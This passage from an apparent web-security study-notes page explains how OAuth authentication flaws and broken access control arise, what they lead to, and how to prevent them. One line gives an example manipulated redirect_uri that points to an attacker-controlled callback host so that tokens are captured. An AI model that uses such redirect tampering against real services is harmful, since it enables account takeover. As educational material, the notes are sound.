                      <a href="https://www.notion.so/Identifying-OAuth-authentication-Recon" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Identifying &amp; Recon <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Vulnerabilities-in-the-OAuth-client-application" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Vulns in Client App <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Vulnerabilities-in-the-OAuth-service" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Vulns in Service <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Vulnerabilities-in-OpenID-Connect" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Vulns in OpenID <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Practice &rarr;</h2>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                      <a href="https://www.notion.so/Writeups" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Notes" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Notes <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How do OAuth authentication vulnerabilities arise? &rarr;</h2>
                    
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1. Flexible Specification (Many Optional Security Settings)</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">The OAuth specification defines only the <strong>core flow</strong>, while many security controls are <strong>optional</strong>.</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Examples of security features that developers must configure correctly:</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><code>state</code> parameter (CSRF protection)</li>
                      <li style="margin-bottom: 10px;">strict <code>redirect_uri</code> validation</li>
                      <li style="margin-bottom: 10px;">PKCE for public clients</li>
                      <li style="margin-bottom: 10px;">secure token storage</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">If these are <strong>not implemented properly</strong>, attackers can exploit the authentication flow.</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Example vulnerability:</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Missing <code>state</code> parameter &rarr; <strong>OAuth CSRF attack</strong></li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2. OAuth Was Designed for Authorization, Not Authentication</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">OAuth was originally meant to <strong>grant access to resources</strong>, not to verify identity.</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Many applications incorrectly use OAuth to <strong>log users in</strong> without properly verifying identity tokens.</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">This leads to problems such as:</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">trusting <strong>unverified user data</strong></li>
                      <li style="margin-bottom: 10px;">relying only on <strong>access tokens</strong></li>
                      <li style="margin-bottom: 10px;">skipping proper token validation</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Protocols like <strong>OpenID Connect</strong> were later created to solve this authentication problem.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3. Sensitive Data Sent Through the Browser</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Some OAuth flows send <strong>important data via browser redirects</strong>, including:</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Authorization codes</li>
                      <li style="margin-bottom: 10px;">Access tokens (in implicit flow)</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Because these values pass through the browser, they can be exposed via:</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">browser history</li>
                      <li style="margin-bottom: 10px;">referrer headers</li>
                      <li style="margin-bottom: 10px;">malicious scripts</li>
                      <li style="margin-bottom: 10px;">open redirects</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Example vulnerability:</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Authorization code interception</strong></li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">4. Improper Redirect URI Validation</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">A very common OAuth flaw occurs when the authorization server <strong>does not strictly validate <code>redirect_uri</code></strong>.</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Attackers may manipulate it to send tokens to their own server.</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Example:</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">redirect_uri=https://attacker.com/callback</code>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Result:</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">access token or authorization code gets sent to attacker.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">5. Poor Token Validation</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Applications sometimes fail to properly verify tokens.</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Common mistakes:</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">not verifying token signature</li>
                      <li style="margin-bottom: 10px;">not checking token audience (<code>aud</code>)</li>
                      <li style="margin-bottom: 10px;">not validating issuer (<code>iss</code>)</li>
                      <li style="margin-bottom: 10px;">accepting expired tokens</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">This can allow attackers to <strong>forge or reuse tokens</strong>.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">6. Lack of Additional Security Controls</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">OAuth depends heavily on developers adding <strong>extra protections</strong>, such as:</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">CSRF protection</li>
                      <li style="margin-bottom: 10px;">input validation</li>
                      <li style="margin-bottom: 10px;">HTTPS enforcement</li>
                      <li style="margin-bottom: 10px;">token expiration checks</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Without these controls, OAuth implementations become vulnerable.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">7. Complexity of the OAuth Flow</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">OAuth flows involve multiple components:</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Client application</li>
                      <li style="margin-bottom: 10px;">Authorization server</li>
                      <li style="margin-bottom: 10px;">Resource server</li>
                      <li style="margin-bottom: 10px;">Browser redirects</li>
                      <li style="margin-bottom: 10px;">Tokens</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Because the flow is <strong>multi-step and complex</strong>, developers often misunderstand how the protocol should be implemented securely.</p>

                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc; margin: 0;">
                        <li style="margin-bottom: 10px;">The protocol is <strong>flexible and loosely defined</strong>.</li>
                        <li style="margin-bottom: 10px;">Many <strong>security settings are optional</strong>.</li>
                        <li style="margin-bottom: 10px;">Developers often <strong>misuse OAuth for authentication</strong>.</li>
                        <li style="margin-bottom: 10px;">Sensitive tokens pass through the <strong>browser</strong>.</li>
                        <li style="margin-bottom: 10px;">Applications sometimes <strong>fail to validate tokens or redirect URIs properly</strong>.</li>
                      </ul>
                    </div>

                  </div>
                </div>
              </div>
            </article>

          </div>
        </article>

        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              Access Control
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text" style="background: rgba(115, 128, 206, 0.05); box-shadow: inset 0 2px 10px rgba(0,0,0,0.02); padding: 30px 25px 30px 45px; border-left: 5px solid #7380ce; border-radius: 0 12px 12px 0; margin-top: 15px;">
            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  Access Control Vulnerabilities
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>

              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 0; margin-bottom: 20px;">What is Access Control Vulnerabilities &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Web security vulnerability</strong> where users are able to access data or perform actions outside of their intended permissions, often due to misconfigurations or flaws in the system's security rules.</li>
                      <li style="margin-bottom: 10px;">Broken access control vulnerabilities exist when a user can access resources or perform actions that they are not supposed to be able to.</li>
                      <li style="margin-bottom: 10px;">Security vulnerability that occur when an application or system fails to restrict access to sensitive data or functionality.</li>
                      <li style="margin-bottom: 10px;">Also occur when app fail to apply access control policies.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Causes &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Missing Authorization Checks:</strong> The application fails to verify a user's permissions for a specific action or page, assuming the user will only use the intended UI flow.</li>
                      <li style="margin-bottom: 10px;"><strong>Insecure Direct Object References (IDOR):</strong> The application exposes internal object identifiers (like <code>?id=123</code>) and trusts user-provided IDs without verifying the user owns or is authorized to access that object.</li>
                      <li style="margin-bottom: 10px;"><strong>Failure to enforce "deny by default":</strong> Instead of explicitly granting access to specific resources, some developers grant access by default, and then try to block it later. This can lead to oversights where restricted resources become available to anyone.</li>
                      <li style="margin-bottom: 10px;"><strong>Client-side access control:</strong> Relying solely on client-side controls, such as JavaScript in the browser, is fundamentally insecure. Attackers can easily bypass these controls by intercepting and modifying requests directly from their machine.</li>
                      <li style="margin-bottom: 10px;"><strong>Privilege Escalation Flaws:</strong> Allowing users to act as administrators or other users, often by tampering with parameters (e.g., <code>"role":"admin"</code> in a JSON payload) or accessing privileged API endpoints.</li>
                      <li style="margin-bottom: 10px;"><strong>Missing Access Controls:</strong> Some endpoints or actions don&rsquo;t have any access checks at all.</li>
                      <li style="margin-bottom: 10px;"><strong>Incorrect Enforcement:</strong> Access controls exist but are applied inconsistently or only on the client side.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Impact &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Information disclosure</strong> &ndash; attackers can access private or sensitive data of other users (e.g., personal files, credit card info).</li>
                      <li style="margin-bottom: 10px;"><strong>Data manipulation</strong> &ndash; attackers can modify or delete other users&rsquo; data.</li>
                      <li style="margin-bottom: 10px;"><strong>Account takeover</strong> &ndash; unauthorized access or changes can lead to full control of another user&rsquo;s account.</li>
                      <li style="margin-bottom: 10px;"><strong>Privilege escalation</strong> &ndash; attackers can perform admin-only actions (e.g., change passwords, assign roles) <strong>by exploiting insecure function calls.</strong></li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">How to Prevent and Mitigation &rarr;</h2>
                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #2563eb; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <ul style="font-size: 1.2rem; padding-left: 20px; list-style-type: disc; margin: 0;">
                        <li style="margin-bottom: 10px;">Never rely on obfuscation alone for access control.</li>
                        <li style="margin-bottom: 10px;">Unless a resource is intended to be publicly accessible, deny access by default.</li>
                        <li style="margin-bottom: 10px;">Wherever possible, use a single application-wide mechanism for enforcing access controls.</li>
                        <li style="margin-bottom: 10px;">At the code level, make it mandatory for developers to declare the access that is allowed for each resource, and deny access by default.</li>
                        <li style="margin-bottom: 10px;">Thoroughly audit and test access controls to ensure they work as designed.</li>
                        <li style="margin-bottom: 10px;"><strong>Enforce the principle of least privilege.</strong> Users and applications should only be granted the minimum permissions necessary to perform their required tasks.</li>
                      </ul>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Study Resources &rarr;</h2>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                      <a href="https://www.notion.so/Attacks-29327bcaaa96802ca053fb9f33dd22fb?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Attacks <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Writeups-26b27bcaaa9680d49b13d0d7a24437c8?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Tools-29327bcaaa96800fa8dac2ee9b704a71?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Tools <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>

                  </div>
                </div>
              </div>
            </article>
          </div>
        </article>

      </div>
    </main>
  </div>

  <script src="app.js"></script>
  <script src="section-toggle.js"></script>
</body>

</html>


